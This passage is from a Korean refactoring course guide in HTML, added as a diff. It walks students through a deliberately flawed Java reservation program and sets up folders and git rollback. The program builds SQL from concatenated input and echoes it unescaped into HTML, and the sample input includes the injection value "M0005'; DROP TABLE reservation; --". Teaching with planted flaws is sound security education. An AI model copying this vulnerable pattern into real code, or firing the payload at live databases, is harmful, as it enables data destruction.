@@ -1,0 +1,4513 @@
+<meta charset="utf-8"><title>애플리케이션 리팩토링 — 준비 교안</title>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/guide.css">
+<style>
+  /* 이 교안에만 있는 것 — 코드 보기 */
+  .bd pre{margin:14px 0;font-family:Consolas,"D2Coding",monospace;font-size:13px;
+          line-height:1.75;border:1px solid #ccc;border-left:3px solid #000;
+          padding:13px 16px;background:#fafafa;overflow-x:auto;white-space:pre}
+  .bd pre b{background:#e6e6e6;font-weight:700}
+  .bd pre i{font-style:normal;color:#777}
+  .bd code{font-family:Consolas,"D2Coding",monospace;font-size:14px;
+           background:#f2f2f2;padding:1px 5px}
+  aside.side code{font-family:Consolas,monospace;font-size:11px;background:#f2f2f2;padding:0 3px}
+</style>
+<script src="../assets/auth.js"></script>
+<script>EXAM_AUTH.guard("../");</script>
+
+<div class="top"><div class="tbar">
+  <div class="brand"><a href="../index.html">과정관리</a><small>커리큘럼 / <a href="../curriculum/web-app-20010202.html">응용SW엔지니어링</a> / 애플리케이션 리팩토링 / 준비 교안</small></div>
+  <div class="tuser" id="tUser"><b id="tName"></b><button id="tOut" type="button">로그아웃</button></div>
+</div></div>
+<script>EXAM_AUTH.paintTop("../");</script>
+
+<button id="qbtn" type="button" aria-label="빠른 이동">목차</button>
+<nav id="qnav" aria-label="빠른 이동">
+  <a class="qt" href="#top"><b>↑</b><span>맨 위로</span></a>
+  <i class="qg">준비</i>
+  <a href="#st1"><b>1</b><span>고칠 코드를 읽는다</span></a>
+  <a href="#st2"><b>2</b><span>완성 산출물의 확인</span></a>
+  <i class="qg">기준 수립</i>
+  <a href="#st3"><b>3</b><span>리팩토링과 그 시점</span></a>
+  <a href="#st4"><b>4</b><span>깨끗한 코드의 기준</span></a>
+  <a href="#st5"><b>5</b><span>품질 목표와 체크리스트</span></a>
+  <i class="qg">소스코드 분석</i>
+  <a href="#st6"><b>6</b><span>개발 표준을 안 지킨 자리</span></a>
+  <a href="#st7"><b>7</b><span>죽은 코드</span></a>
+  <a href="#st8"><b>8</b><span>보안 약점</span></a>
+  <i class="qg">적용</i>
+  <a href="#st9"><b>9</b><span>메서드 추출</span></a>
+  <a href="#st10"><b>10</b><span>메서드 이동</span></a>
+  <a href="#st11"><b>11</b><span>임시 변수 정리</span></a>
+  <a href="#st12"><b>12</b><span>SQL 삽입을 막는다</span></a>
+  <a href="#st13"><b>13</b><span>화면 출력을 막는다</span></a>
+  <i class="qg">기능 확인</i>
+  <a href="#st14"><b>14</b><span>회귀 테스트</span></a>
+  <a href="#st15"><b>15</b><span>체크리스트 대조</span></a>
+  <i class="qg">마무리</i>
+  <a href="#st16"><b>16</b><span>자가 점검과 제출</span></a>
+  <i class="qg">감점</i>
+  <a href="#g3"><b>!</b><span>주요 감점 요인</span></a>
+</nav>
+
+<div class="wrap" id="top">
+
+<h1>애플리케이션 리팩토링 — 준비 교안</h1>
+<p class="sub">능력단위 애플리케이션 리팩토링 (2001020217_23v6) / 6수준 ·
+   능력단위요소 3개 · 학습 내용 4개</p>
+
+<!-- ═══════ 0 ═══════ -->
+<h2 class="sec" id="g0">0. 이 교과가 만드는 것</h2>
+<div class="sect">
+  <aside class="side">
+    <p class="pt">기능은 그대로 두고 안을 고칩니다.</p>
+    <b class="sh">내는 것</b>
+    <p class="v">리팩토링 기준서 · 분석 결과서 · 고친 소스 · 회귀 시험 결과</p>
+    <b class="sh">참고</b>
+    <p class="src">NCS 학습모듈 LM2001020217_23v6</p>
+  </aside>
+  <div class="bd">
+
+<div class="note">시작 전에 받아야 하는 것
+<table class="wide">
+  <tr><td class="nm">고칠 소스</td>
+      <td>앞 교과에서 만든 예약 프로그램. 없으면 실습 1 에서 받습니다</td></tr>
+  <tr><td class="nm">JDK 21</td>
+      <td><code>javac -version</code> 으로 확인합니다</td></tr>
+  <tr><td class="nm">파이썬</td>
+      <td>분석 도구 넷을 만듭니다</td></tr>
+  <tr><td class="nm">작업지시서</td><td>제출 형식이 여기 적혀 있습니다</td></tr>
+</table>
+작업지시서는 평가도구라 이 사이트에 올려 두지 않습니다. 수업 시간에 받으십시오.
+</div>
+
+<h4>셋을 배웁니다</h4>
+
+<table class="wide">
+  <tr><th style="width:56px">묶음</th><th style="width:210px">능력단위요소</th>
+      <th>학습 내용</th></tr>
+  <tr><td class="c">①</td><td>리팩토링 기준 수립하기</td>
+      <td>품질 목표 · 체크리스트 · 도구와 절차</td></tr>
+  <tr><td class="c">②</td><td>소스코드 분석하기</td>
+      <td>개발 표준 위반 · 불필요한 코드 · 잠재 결함</td></tr>
+  <tr><td class="c">③</td><td>리팩토링 적용하기</td>
+      <td>구조 개선 · 기능 유지 확인</td></tr>
+</table>
+
+<p>앞 교과 소프트웨어공학 활용에서 품질을 재는 법을 배웠고,
+   소프트웨어개발 방법론 활용에서 언제 무엇을 낼지 정했습니다.
+   이 교과는 이미 돌아가는 코드를 열어서 안을 고칩니다.
+   돌아가는 코드를 건드리는 일이라 앞의 두 교과보다 위험이 큽니다.</p>
+
+<div class="warn">이 교과의 규칙은 하나로 줄일 수 있습니다.
+  겉으로 드러나는 동작이 한 글자도 달라지면 안 됩니다.
+  화면에 찍히는 글자, 파일에 남는 값, 돌려주는 숫자가 고치기 전과 같아야 합니다.
+  <b>그것을 증명하는 것이 회귀 테스트</b>이고, 증명 없이 고친 것은 리팩토링이 아니라 수정입니다.
+</div>
+
+<h4>핵심 용어 여덟</h4>
+
+<table class="wide">
+  <tr><th style="width:190px">용어</th><th style="width:70px">실습</th><th></th></tr>
+  <tr><td>리팩토링</td><td class="c">3</td>
+      <td>기능을 그대로 둔 채 내부 구조를 고치는 일</td></tr>
+  <tr><td>깨끗한 코드</td><td class="c">4</td>
+      <td>가독성 · 변경 용이성 · 중복 없음 · 주의 깊음</td></tr>
+  <tr><td>체크리스트</td><td class="c">5 · 15</td>
+      <td>다 고쳤는지 한 줄씩 확인하는 목록</td></tr>
+  <tr><td>개발 표준</td><td class="c">6</td>
+      <td>이름 짓는 법 · 들여쓰기 · 줄 길이 같은 약속</td></tr>
+  <tr><td>죽은 코드</td><td class="c">7</td>
+      <td>아무도 안 부르는 것과 닿을 수 없는 것</td></tr>
+  <tr><td>보안 약점</td><td class="c">8 · 12 · 13</td>
+      <td>SQL 삽입 · 크로스 사이트 스크립트</td></tr>
+  <tr><td>메서드 추출</td><td class="c">9 ~ 11</td>
+      <td>긴 메서드에서 한 덩어리를 떼어 내는 기법</td></tr>
+  <tr><td>회귀 테스트</td><td class="c">14</td>
+      <td>고치기 전후의 결과를 견주는 시험</td></tr>
+</table>
+
+<h4>내는 것은 넷입니다</h4>
+
+<table class="wide">
+  <tr><th style="width:56px"></th><th style="width:180px">제출물</th><th>내용</th></tr>
+  <tr><td class="c">1</td><td>리팩토링 기준서</td>
+      <td>품질 목표 · 체크리스트 · 쓸 도구와 절차</td></tr>
+  <tr><td class="c">2</td><td>소스코드 분석 결과서</td>
+      <td>표준 위반 · 죽은 코드 · 보안 약점 목록</td></tr>
+  <tr><td class="c">3</td><td>고친 소스</td>
+      <td>순수 리팩토링분과 보안 조치분을 나눠서</td></tr>
+  <tr><td class="c">4</td><td>회귀 시험 결과서</td>
+      <td>달라진 줄과 그 까닭</td></tr>
+</table>
+  </div>
+</div>
+
+<!-- ═══════ 1 ═══════ -->
+<h2 class="sec" id="g1">1. 이 교과의 범위</h2>
+<div class="sect">
+  <aside class="side">
+    <p class="pt">돌아가는 코드를 건드립니다.</p>
+    <b class="sh">능력단위요소</b>
+    <p class="v">기준 수립하기 · 소스코드 분석하기 · 리팩토링 적용하기</p>
+    <b class="sh">선수 학습</b>
+    <p class="v">응용SW 기초 기술 활용 · 소프트웨어공학 활용 · 소프트웨어개발 방법론 활용</p>
+  </aside>
+  <div class="bd">
+
+<h4>판을 나눠 고칩니다</h4>
+
+<p class="cmdline"><code>before   한 파일 103줄. process() 하나가 다 합니다
+
+  step1a   메서드 추출         1파일 118줄     실습 9
+  step1b   메서드 이동         2파일 123줄     실습 10
+  step1    임시 변수 정리       3파일 123줄     실습 11
+           ─ 여기까지 화면 출력이 한 글자도 안 바뀝니다
+
+  step2    보안 약점 조치       5파일 173줄     실습 12 · 13
+           ─ 여기서 출력이 바뀝니다</code></p>
+
+<p>단계를 둘로 나누는 것이 이 교안의 뼈대입니다.
+   구조를 고치는 일과 동작을 고치는 일을 한 번에 하면
+   회귀 테스트에서 달라진 줄이 나왔을 때 어느 쪽 탓인지 가릴 수 없습니다.</p>
+
+<h4>어디까지 하나</h4>
+
+<table class="wide">
+  <tr><th style="width:150px">분야</th><th style="width:250px">여기서 하는 것</th><th>여기서 안 하는 것</th></tr>
+  <tr><td>구조 개선</td>
+      <td>메서드 추출 · 이동 · 임시 변수 정리</td>
+      <td>설계를 처음부터 다시 하는 일</td></tr>
+  <tr><td>보안</td>
+      <td>SQL 삽입과 화면 출력 약점 둘</td>
+      <td>인증 · 암호화 — 정보보안 교과</td></tr>
+  <tr><td>시험</td>
+      <td>회귀 테스트로 기능 유지 확인</td>
+      <td>테스트 설계 기법 — 테스트 교과</td></tr>
+</table>
+
+<h4>이 교안이 쓰는 것</h4>
+
+<p class="cmdline"><code>언어        자바 21 (OpenJDK 21.0.2)
+분석 도구     표준검사.py · 죽은코드.py · 보안약점.py · 복잡도.py
+시험 도구     회귀테스트.py
+견줄 대상     같은 프로그램의 세 판 (before · step1 · step2)</code></p>
+
+<div class="note">도구를 직접 만드는 까닭은 도구가 무엇을 못 하는지 알기 위해서입니다.
+  이 교안에서 만드는 넷은 다 정규식으로 줄을 훑는 방식이라 한계가 뚜렷합니다.
+  실습 7 과 8 에서 그 한계가 오탐과 미탐으로 드러나는데,
+  도구를 사서 쓰더라도 결과를 그대로 믿으면 안 된다는 것이 그 자리에서 보입니다.
+</div>
+  </div>
+</div>
+
+<!-- ═══════ 2 ═══════ -->
+<h2 class="sec" id="g2">2. 실습</h2>
+<div class="sect">
+  <aside class="side">
+    <p class="pt">재고, 고치고, 견줍니다.</p>
+    <b class="sh">시간</b>
+    <p class="v">레벨 4에 가장 오래 씁니다</p>
+  </aside>
+  <div class="bd">
+
+<table class="wide">
+  <tr><th style="width:160px">레벨</th><th style="width:190px">무엇</th>
+      <th style="width:90px">실습</th><th>끝나면</th></tr>
+  <tr><td>1 · 준비</td><td>고칠 코드와 낼 것</td><td class="c">1 ~ 2</td>
+      <td>어디가 문제인지 손으로 짚습니다</td></tr>
+  <tr><td>2 · 기준 수립</td><td>목표와 체크리스트</td><td class="c">3 ~ 5</td>
+      <td>요소 <b>①</b></td></tr>
+  <tr><td>3 · 소스코드 분석</td><td>표준 · 죽은 코드 · 보안</td><td class="c">6 ~ 8</td>
+      <td>요소 <b>②</b></td></tr>
+  <tr><td>4 · 적용</td><td>추출 · 이동 · 정리 · 보안</td><td class="c">9 ~ 13</td>
+      <td>요소 <b>③</b> 앞쪽</td></tr>
+  <tr><td>5 · 기능 확인</td><td>회귀 테스트와 대조</td><td class="c">14 ~ 15</td>
+      <td>요소 <b>③</b> 뒤쪽</td></tr>
+  <tr><td>6 · 마무리</td><td>점검 · 제출</td><td class="c">16</td><td>냅니다</td></tr>
+</table>
+
+<p>실습 14 가 이 교과에서 가장 중요한 자리입니다.
+   구조만 고친 판은 달라진 줄이 0개로 나와야 하고, 보안을 고친 판은 0개일 수가 없습니다.
+   그 차이를 눈으로 보는 것이 이 교과의 목표입니다.</p>
+  </div>
+</div>
+<h3 class="lv">레벨 1 · 준비 <span>고칠 코드를 먼저 읽습니다</span></h3>
+
+<div class="step" id="st1">
+      <h3><i>1</i>고칠 코드를 읽는다</h3>
+      <aside class="side">
+        <p class="pt">문제를 도구보다 먼저 봅니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 2-1</p>
+        <b class="sh">용어</b>
+        <p class="v">코드 냄새 · 긴 메서드</p>
+      </aside>
+      <div class="bd">
+
+<h4>한 메서드가 다 하고 있습니다</h4>
+
+<p class="cmdline"><code>ReservationConsole.process()
+
+  회원 번호 검사
+  시설 번호 검사
+  시설 찾기
+  날짜 검사
+  정원 확인
+  SQL 만들기
+  저장 건수 세기
+  화면 출력
+
+64줄 · 분기 열아홉 갈래</code></p>
+
+<p>여덟 가지 일이 한 메서드에 들어 있어서, 하나를 고치려면 나머지 일곱을 다 읽어야 합니다.</p>
+
+<h4>깃발 변수가 흐름을 이끕니다</h4>
+
+<p class="cmdline"><code>boolean ok = true;
+if (member == null ...) { LASTERROR = "..."; ok = false; }
+if (ok) { ... ok = false; }
+if (ok) { ... ok = false; }
+if (ok) { ... }
+
+ok 가 참인지 따지는 if 가 다섯 번 나옵니다</code></p>
+
+<p>검사가 하나 늘 때마다 <code>if (ok)</code> 블록이 하나씩 붙습니다.
+   들여쓰기가 깊어지고, 어느 검사에서 걸렸는지는 <code>LASTERROR</code> 를 따라가야 압니다.</p>
+
+<h4>이름이 제각각입니다</h4>
+
+<p class="cmdline"><code>data           무엇이 담기는지 안 드러납니다
+count          무엇을 센 것인지 안 드러납니다
+LASTERROR      필드인데 상수처럼 생겼습니다
+max            상수인데 필드처럼 생겼습니다
+Format_Name    자바에서 안 쓰는 표기입니다</code></p>
+
+<h4>돌려 봅니다</h4>
+
+<p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+&gt; java -Dstdout.encoding=utf-8 -cp before\classes ReservationConsole
+[SQL] INSERT INTO reservation VALUES ('M0001', 'F01', '2026-10-01 09:00')
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0001&lt;/div&gt;
+...
+[SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation; --', 'F01', '2026-10-03 11:00')
+처리 건수 : 3</code></p>
+
+<div class="warn">맨 아래에서 둘째 줄을 눈여겨보십시오.
+  회원 번호 자리에 넣은 <code>M0005'; DROP TABLE reservation; --</code> 가
+  SQL 문장 안에 그대로 들어가 따옴표를 닫고 새 명령을 열었습니다.
+  실제 데이터베이스에 보냈다면 표가 지워집니다.
+  이 프로그램은 지금 돌아가고 있고, 시험도 통과했을 것입니다.
+</div>
+
+<h4>돌아간다고 괜찮은 것은 아닙니다</h4>
+
+<p>리팩토링을 배우는 자리에서 가장 먼저 부딪히는 물음이 이것입니다.
+   잘 돌아가는 코드를 왜 건드리느냐는 물음인데, 답은 두 가지입니다.
+   하나는 다음에 고칠 때 드는 시간이고, 다른 하나는 위 상자에서 본 것처럼 숨어 있는 위험입니다.</p>
+      <div class="lab">
+  <b class="t">실습 1</b>
+  <b>고칠 코드를 받아 돌리고 손으로 훑는다</b>
+
+  <p><b>목적</b> — 도구를 만들기 전에 눈으로 먼저 봅니다.
+     어디가 거슬리는지 표시해 두었다가 실습 6 부터 도구가 찾아낸 것과 견줘 보십시오.
+     사람이 놓치는 자리와 도구가 놓치는 자리가 서로 다릅니다.</p>
+
+  <h5>절차 1 — 소스를 받아 적는다</h5>
+
+  <p class="cmdline"><code>before\src\ReservationConsole.java
+
+import java.util.*;
+
+public class ReservationConsole {
+
+    static ArrayList&lt;String[]&gt; data = new ArrayList&lt;&gt;();
+    public static int count = 0;
+    private static String LASTERROR = "";
+    private static final int max = 20;
+
+    public static void main(String[] args) {
+        seed();
+        process("M0001", "F01", "2026-10-01", "09:00");
+        process("M0002", "F01", "2026-10-01", "09:00");
+        process("M0003", "F99", "2026-10-02", "10:00");
+        process("M0004", "F01", "2026-13-01", "10:00");
+        process("M0005'; DROP TABLE reservation; --", "F01", "2026-10-03", "11:00");
+        report();
+    }
+
+    static void seed() {
+        data.add(new String[]{"F01", "체육관 A", "20"});
+        data.add(new String[]{"F02", "체육관 B", "30"});
+    }
+
+    // 예약을 처리한다. 검증 · 정원 확인 · 저장 · 로그를 한 자리에서 한다.
+    public static void process(String member, String facility, String day, String time) {
+        String sql = "";
+        String msg = "";
+        boolean ok = true;
+        int cap = 0;
+        String name = null;
+        if (member == null || member.length() == 0) {
+            LASTERROR = "회원 번호가 없습니다";
+            ok = false;
+        }
+        if (ok) {
+            if (facility == null || facility.length() == 0) {
+                LASTERROR = "시설 번호가 없습니다";
+                ok = false;
+            }
+        }
+        if (ok) {
+            boolean found = false;
+            for (int i = 0; i &lt; data.size(); i++) {
+                if (data.get(i)[0].equals(facility)) {
+                    found = true;
+                    name = data.get(i)[1];
+                    cap = Integer.parseInt(data.get(i)[2]);
+                }
+            }
+            if (!found) {
+                LASTERROR = "없는 시설입니다 : " + facility;
+                ok = false;
+            }
+        }
+        if (ok) {
+            String[] p = day.split("-");
+            int mm = Integer.parseInt(p[1]);
+            if (mm &lt; 1 || mm &gt; 12) {
+                LASTERROR = "날짜가 올바르지 않습니다 : " + day;
+                ok = false;
+            }
+        }
+        if (ok) {
+            int used = 0;
+            for (int i = 0; i &lt; data.size(); i++) {
+                if (data.get(i).length &gt; 3 &amp;&amp; data.get(i)[3].equals(day)) {
+                    used++;
+                }
+            }
+            if (used &gt;= cap) {
+                LASTERROR = "정원을 넘었습니다";
+                ok = false;
+            }
+        }
+        if (ok) {
+            sql = "INSERT INTO reservation VALUES ('" + member + "', '" + facility
+                + "', '" + day + " " + time + "')";
+            System.out.println("[SQL] " + sql);
+            count = count + 1;
+            msg = "예약되었습니다 : " + name + " " + day + " " + time;
+            System.out.println("&lt;div&gt;" + msg + "&lt;/div&gt;");
+            System.out.println("&lt;div&gt;신청자 : " + member + "&lt;/div&gt;");
+            System.out.println("&lt;div class='sum'&gt;" + name + " / " + day + " / " + time + " / " + member + " / 누적 " + count + "건&lt;/div&gt;");
+        } else {
+            msg = LASTERROR;
+            System.out.println("&lt;div class='err'&gt;" + msg + "&lt;/div&gt;");
+        }
+    }
+
+    static void report() {
+        System.out.println("처리 건수 : " + count);
+    }
+
+    private static String Format_Name(String s) {
+	 return s.trim().toUpperCase();
+    }
+
+    static int unused(int a, int b) {
+        return a + b;
+        // 아래는 절대 실행되지 않는다
+    }
+}</code></p>
+
+  <p><code>Format_Name</code> 안쪽 한 줄의 들여쓰기에 탭이 하나 섞여 있습니다.
+     일부러 넣어 둔 것이니 그대로 옮겨 적으십시오.
+     실습 6 의 도구가 이 줄을 찾아냅니다.</p>
+
+  <h5>절차 2 — 컴파일하고 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+&gt; java -Dstdout.encoding=utf-8 -cp before\classes ReservationConsole
+[SQL] INSERT INTO reservation VALUES ('M0001', 'F01', '2026-10-01 09:00')
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0001&lt;/div&gt;
+&lt;div class='sum'&gt;체육관 A / 2026-10-01 / 09:00 / M0001 / 누적 1건&lt;/div&gt;
+[SQL] INSERT INTO reservation VALUES ('M0002', 'F01', '2026-10-01 09:00')
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0002&lt;/div&gt;
+&lt;div class='sum'&gt;체육관 A / 2026-10-01 / 09:00 / M0002 / 누적 2건&lt;/div&gt;
+&lt;div class='err'&gt;없는 시설입니다 : F99&lt;/div&gt;
+&lt;div class='err'&gt;날짜가 올바르지 않습니다 : 2026-13-01&lt;/div&gt;
+[SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation; --', 'F01', '2026-10-03 11:00')
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-03 11:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0005'; DROP TABLE reservation; --&lt;/div&gt;
+&lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005'; DROP TABLE reservation; -- / 누적 3건&lt;/div&gt;
+처리 건수 : 3</code></p>
+
+  <p>열다섯 줄이 나옵니다. 이 열다섯 줄이 앞으로 계속 견줄 기준입니다.</p>
+
+  <h5>절차 3 — 화면을 파일로 남긴다</h5>
+
+  <p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp before\classes ReservationConsole &gt; before\출력.txt
+&gt; powershell -c "(Select-String before\출력.txt -Pattern div -SimpleMatch).Count"
+11</code></p>
+
+  <p>화면에 찍힌 것을 파일로 잡아 두면 눈으로 견줄 때 편합니다.
+     실습 14 에서 만들 도구는 이 일을 자동으로 합니다.</p>
+
+  <h5>절차 4 — 거슬리는 자리를 손으로 표시한다</h5>
+
+  <p class="cmdline"><code>before\손으로찾은것.md
+
+| 줄 | 무엇이 거슬리나 | 왜 |
+|-----|-----------------|-----|
+| | | |
+| | | |
+| | | |</code></p>
+
+  <p>적어도 다섯 줄은 채우십시오.
+     정답을 맞히는 표는 아니고, 실습 6 부터 도구 결과와 견주려고 만드는 표입니다.
+     사람 눈에는 들어오는데 우리 도구는 못 찾는 항목이 반드시 나옵니다.</p>
+
+  <h5>절차 5 — process 가 하는 일을 세어 본다</h5>
+
+  <p class="cmdline"><code>| 번호 | 무엇을 하는가 | 몇 줄 |
+|------|---------------|-------|
+| 1 | 회원 번호를 검사 | 4 |
+| 2 | 시설 번호를 검사 | 6 |
+| 3 | 시설을 찾고 이름과 정원을 꺼냄 | 14 |
+| 4 | 날짜의 달을 검사 | 8 |
+| 5 | 그날 잡힌 건수를 세고 정원과 비교 | 12 |
+| 6 | SQL 을 만들고 찍음 | 3 |
+| 7 | 건수를 세고 받아들인 결과를 찍음 | 5 |
+| 8 | 어긋났을 때 까닭을 찍음 | 4 |</code></p>
+
+  <p>여덟 가지입니다. 이 여덟이 실습 9 에서 떼어 낼 후보가 됩니다.</p>
+
+  <h5>절차 6 — if 를 세어 본다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Select-String before\src\ReservationConsole.java -Pattern 'if (' -SimpleMatch).Count"
+12
+&gt; powershell -c "(Select-String before\src\ReservationConsole.java -Pattern 'if (ok) {' -SimpleMatch).Count"
+5</code></p>
+
+  <p>열둘 가운데 다섯이 <code>if (ok)</code> 입니다.
+     이 다섯은 무엇을 검사하는 것이 아니라 앞의 검사가 통과했는지만 다시 묻습니다.
+     검사가 일곱 개인데 <code>if</code> 는 열두 개인 까닭이 여기에 있습니다.</p>
+
+  <div class="note">이 프로그램은 오류 없이 돌고 결과도 맞습니다.
+    그런데도 고칠 거리가 열 개 넘게 나옵니다.
+    돌아가는지 여부와 고치기 쉬운지 여부가 따로 논다는 것이 이 교과의 출발점입니다.
+  </div>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>한글이 물음표로 찍힌다</td>
+        <td><code>-Dstdout.encoding=utf-8</code> 을 빠뜨렸습니다</td></tr>
+    <tr><td>PowerShell 에서 오류가 난다</td>
+        <td>따옴표로 묶어 <code>"-Dstdout.encoding=utf-8"</code> 로 쓰십시오</td></tr>
+    <tr><td><code>javac</code> 가 없다</td>
+        <td>JDK 가 아니라 JRE 만 깔린 것입니다</td></tr>
+    <tr><td>탭을 어떻게 넣나</td>
+        <td>편집기에서 탭 변환을 잠시 끄십시오</td></tr>
+    <tr><td>거슬리는 자리를 못 찾겠다</td>
+        <td>이름부터 보십시오. <code>data</code> 가 무엇인지 알겠습니까</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>ReservationConsole.java</code>, 컴파일과 실행 화면,
+     <code>출력.txt</code>, <code>손으로찾은것.md</code>(다섯 줄 이상),
+     process 가 하는 일 표, <code>if</code> 개수</p>
+
+  <p><b>스스로 확인</b> —
+     ① 열다섯 줄이 나오는 것을 봤습니까
+     ② 출력을 파일로 남겼습니까
+     ③ 거슬리는 자리를 다섯 개 이상 적었습니까
+     ④ <code>if (ok)</code> 가 몇 번 나오는지 셌습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st2">
+      <h3><i>2</i>완성 산출물의 확인</h3>
+      <aside class="side">
+        <p class="pt">낼 것을 먼저 보고 시작합니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 평가</p>
+        <b class="sh">내는 것</b>
+        <p class="v">기준서 · 분석 결과서 · 고친 소스 · 시험 결과서</p>
+      </aside>
+      <div class="bd">
+
+<h4>분석 도구가 찾아낸 것</h4>
+
+<p class="cmdline"><code>&gt; python 표준검사.py before\src
+파일                          줄  갈래      이름            규칙
+--------------------------------------------------------------------------
+ReservationConsole.java     7  필드명     LASTERROR     낙타 표기
+ReservationConsole.java     8  상수명     max           대문자와 밑줄
+ReservationConsole.java    84  줄길이     136자          100자 이하
+ReservationConsole.java    95  메서드명    Format_Name   낙타 표기
+ReservationConsole.java    96  탭                     공백 4칸
+--------------------------------------------------------------------------
+지적 5건</code></p>
+
+<h4>구조가 얼마나 달라지는지</h4>
+
+<p class="cmdline"><code>판         파일   줄    메서드   process 줄   process 복잡도
+before       1   103      6       64            19
+step1a       1   118     11       44            13
+step1b       2   123     11       44            13
+step1        3   123     14       11             2
+step2        5   173     20       11             2</code></p>
+
+<p>줄 수는 103 에서 173 으로 늘었는데 process 의 복잡도는 19 에서 2 로 떨어졌습니다.
+   코드를 줄이는 것이 리팩토링이라고 생각했다면 여기서 한 번 걸립니다.</p>
+
+<p>step1a 와 step1b 의 숫자가 똑같은 것도 눈여겨보십시오.
+   메서드를 다른 클래스로 옮겼는데 복잡도가 하나도 안 움직였습니다.</p>
+
+<h4>기능이 그대로인지</h4>
+
+<p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1\classes
+...
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py step1\classes step2\classes
+...
+줄 15개 · 다른 줄 5개
+■ 바뀐 줄이 5개 — 의도한 것인지 확인하십시오</code></p>
+
+<p>위가 구조만 고친 결과이고 아래가 보안을 고친 결과입니다. 두 숫자가 이 교과의 전부라고 해도 지나치지 않습니다.</p>
+
+<h4>폴더를 미리 만든다</h4>
+
+<p class="cmdline"><code>&gt; mkdir 리팩토링
+&gt; cd 리팩토링
+&gt; mkdir before step1 step2 도구 분석 화면</code></p>
+
+<table class="wide">
+  <tr><th style="width:110px">폴더</th><th style="width:250px">들어갈 것</th><th>나오는 실습</th></tr>
+  <tr><td><code>before</code></td><td>고치기 전 소스와 클래스</td><td>1</td></tr>
+  <tr><td><code>step1</code></td><td>구조만 고친 소스</td><td>9 ~ 11</td></tr>
+  <tr><td><code>step2</code></td><td>보안까지 고친 소스</td><td>12 · 13</td></tr>
+  <tr><td><code>도구</code></td><td>분석 도구 넷과 회귀 시험</td><td>6 ~ 8 · 14</td></tr>
+  <tr><td><code>분석</code></td><td>기준서 · 분석 결과서 · 체크리스트</td><td>3 ~ 5 · 15</td></tr>
+  <tr><td><code>화면</code></td><td>도구를 돌린 화면</td><td>6 ~ 8 · 14</td></tr>
+</table>
+      <div class="lab">
+  <b class="t">실습 2</b>
+  <b>폴더를 만들고 되돌릴 수 있게 해 둔다</b>
+
+  <p><b>목적</b> — 이 교과는 돌아가는 코드를 건드립니다.
+     망가뜨렸을 때 되돌아갈 자리를 먼저 만들어 두고 시작하십시오.
+     그 자리가 없으면 고치다가 멈출 수 없습니다.</p>
+
+  <h5>절차 1 — 폴더를 만든다</h5>
+
+  <p class="cmdline"><code>&gt; mkdir 리팩토링
+&gt; cd 리팩토링
+&gt; mkdir before step1a step1b step1 step2 도구 분석 화면
+&gt; dir /b
+before
+step1
+step1a
+step1b
+step2
+도구
+분석
+화면</code></p>
+
+  <p>판마다 폴더를 따로 두는 것이 이 교안의 방식입니다.
+     실무에서는 한 폴더를 고쳐 가며 형상관리로 판을 남기는데,
+     배우는 자리에서는 다섯 판을 나란히 놓고 견주는 편이 눈에 잘 들어옵니다.</p>
+
+  <h5>절차 2 — 고치기 전 판을 옮겨 둔다</h5>
+
+  <p class="cmdline"><code>&gt; copy ..\before\src\ReservationConsole.java before\src\
+&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+&gt; dir before\classes /b
+ReservationConsole.class</code></p>
+
+  <p><code>classes</code> 까지 만들어 두는 것이 중요합니다.
+     실습 14 의 도구가 소스가 아니라 컴파일된 결과를 돌려서 견주기 때문입니다.</p>
+
+  <h5>절차 3 — 형상관리를 시작한다</h5>
+
+  <p class="cmdline"><code>&gt; git init
+&gt; git add .
+&gt; git commit -m "리팩토링 전 — 고칠 코드와 실행 결과"
+&gt; git log --oneline
+3f9a2c1 리팩토링 전 — 고칠 코드와 실행 결과</code></p>
+
+  <p>고치기 전 상태를 한 번 끊어 두면 언제든 돌아올 수 있습니다.</p>
+
+  <h5>절차 4 — 되돌리기를 연습한다</h5>
+
+  <p class="cmdline"><code>일부러 망가뜨립니다
+
+&gt; echo oops &gt;&gt; before\src\ReservationConsole.java
+&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+before\src\ReservationConsole.java:104: error: reached end of file while parsing
+oops
+^
+1 error
+
+되돌립니다
+
+&gt; git checkout -- before\src\ReservationConsole.java
+&gt; javac -encoding utf-8 -proc:none -d before\classes before\src\ReservationConsole.java
+(오류 없음)</code></p>
+
+  <p>이 연습을 한 번 해 두면 뒤에서 마음 편히 고칠 수 있습니다.</p>
+
+  <h5>절차 5 — 낼 것 넷을 훑는다</h5>
+
+  <p class="cmdline"><code>① 리팩토링 기준서      품질 목표 · 체크리스트 · 절차      실습 5
+② 소스코드 분석 결과서  표준 위반 · 죽은 코드 · 보안 약점   실습 6 ~ 8
+③ 고친 소스           step1a · step1b · step1 · step2   실습 9 ~ 13
+④ 회귀 시험 결과서     바뀐 줄과 까닭                    실습 14</code></p>
+
